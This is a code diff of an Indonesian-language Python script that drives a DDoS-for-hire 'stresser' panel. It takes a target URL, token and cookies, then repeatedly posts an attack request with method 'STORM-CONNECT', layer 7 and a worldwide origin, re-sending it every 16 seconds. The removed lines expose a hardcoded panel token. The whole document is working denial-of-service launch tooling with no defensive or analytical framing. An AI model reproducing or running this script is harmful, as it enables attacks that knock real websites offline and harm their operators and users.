@@ -22,34 +22,30 @@ def animate_cowsay(message):
     cowsay.cow(message)
 
 def main():
-    # Prompt user for name, target URL, and cookie with animation
+    # Prompt user for name, token, and cookies with animation
     name = get_input("Masukkan nama: ")
-    target_url = get_input("Masukkan URL target: ")
-    cookie = get_input("Masukkan cookie: ")
+    host = get_input("Masukkan target URL: ")
+    token = get_input("Masukkan token: ")
+    cookies = get_input("Masukkan cookies: ")
 
-    # Headers for the request
+    # Update the headers with the user-provided token and cookies
     headers = {
-        "Cookie": cookie,
+        "Cookie": cookies,
+        "Authorization": f"Bearer {token}",
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
-        "Accept": "*/*",
-        "Referer": "",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9"
     }
 
-    # Request URL
+    # Request URL and payload
     url = "https://stresse.net/panel/load"
-
-    # Request body
-    body = {
+    payload = {
         "addParams": {
             "reqMethod": "GET",
             "ignore": True,
             "randpath": False,
             "debug": False,
             "referer": "",
-            "extra": False
+            "extra": False,
         },
         "ackseq": 0,
         "seq": 0,
@@ -80,7 +76,7 @@ def main():
             {"name": "RST", "checked": 0},
             {"name": "PSH", "checked": 0},
             {"name": "ACK", "checked": 0},
-            {"name": "URG", "checked": 0}
+            {"name": "URG", "checked": 0},
         ],
         "streams": "",
         "connections": "",
@@ -101,7 +97,7 @@ def main():
         "tor": 0,
         "attackMethod": "24",
         "attackMethodName": "STORM-CONNECT",
-        "targetUrl": target_url,
+        "targetUrl": host,
         "concActive": 1,
         "layerID": 7,
         "precheck": 0,
@@ -122,20 +118,20 @@ def main():
         "userAgentSmart": "Random",
         "userAgentCustom": "",
         "attackOriginActive": "Worldwide",
-        "token": "933827d6296e56b31e74198f9f10ff330e3eaed0e7e5714773bfe4d9c44eb0e1"
+        "token": token,
     }
 
     while True:
         try:
-            response = requests.post(url, headers=headers, data=json.dumps(body))
+            response = requests.post(url, headers=headers, data=json.dumps(payload))
             if response.status_code == 200:
-                message = f"Nama: {name}\nURL Target: {target_url}\nAttack telah berjalan dengan sukses!"
+                message = f"Copyright © mnytc\nNama: {name}\nRequest berhasil dikirim!"
                 animate_cowsay(message)
             else:
-                slow_print(f"Error: {response.status_code}")
+                slow_print(f"Error: {response.status_code} - {response.text}")
         except Exception as e:
             slow_print(f"Terjadi kesalahan: {e}")
-        time.sleep(11)  # Delay 11 detik sebelum request berikutnya
+        time.sleep(16)  # Delay 11 detik sebelum request berikutnya
 
 if __name__ == "__main__":
     main()
